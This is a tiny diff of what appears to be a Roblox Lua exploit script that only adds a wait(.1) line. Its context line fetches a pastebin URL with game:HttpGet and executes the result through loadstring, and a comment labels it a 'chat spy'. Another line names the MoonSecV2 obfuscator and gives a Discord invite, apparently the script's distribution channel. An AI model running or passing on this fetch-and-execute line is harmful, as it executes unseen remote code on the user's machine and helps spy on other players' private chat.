@@ -1,4 +1,5 @@
 loadstring(game:HttpGet('https://pastebin.com/raw/8nCLvvEE'))(); -- chat spy
+wait(.1)
 
 _OhN49kJ8pPb7JtIp, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
 
